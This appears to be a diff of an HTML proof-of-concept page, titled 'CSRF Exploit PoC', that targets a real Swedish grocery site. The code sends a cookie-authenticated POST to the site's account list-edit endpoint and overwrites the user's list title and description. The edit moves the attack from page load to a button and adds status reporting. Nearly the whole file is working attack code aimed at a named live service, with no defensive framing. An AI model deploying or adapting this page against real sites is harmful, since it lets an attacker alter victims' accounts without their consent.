@@ -1,21 +1,39 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>CSRF Exploit PoC</title>
+  </head>
   <body>
-    <h1>CSRF Attack Demo</h1>
+    <h1>CSRF Exploit Test</h1>
+    <button onclick="sendCSRF()">Submit Exploit</button>
+    
+    <p id="status"></p>
+
     <script>
-      fetch("https://www.mathem.se/se/account/lists/edit/", {
-        method: "POST",
-        credentials: "include", // ✅ Includes user's cookies
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          title: "Hacked",
-          description: "CSRF via CORS misconfig"
+      function sendCSRF() {
+        fetch("https://www.mathem.se/se/account/lists/edit/", {
+          method: "POST",
+          credentials: "include", // ✅ sends cookies
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            title: "CSRF attack",
+            description: "This was changed via a CSRF attack using CORS misconfig."
+          })
         })
-      })
-      .then(res => res.text())
-      .then(data => console.log("Response:", data));
+        .then(response => {
+          document.getElementById("status").innerText = "Status: " + response.status;
+          return response.text();
+        })
+        .then(data => {
+          console.log("Server Response:", data);
+        })
+        .catch(error => {
+          document.getElementById("status").innerText = "Error: " + error;
+          console.error("Fetch Error:", error);
+        });
+      }
     </script>
   </body>
 </html>
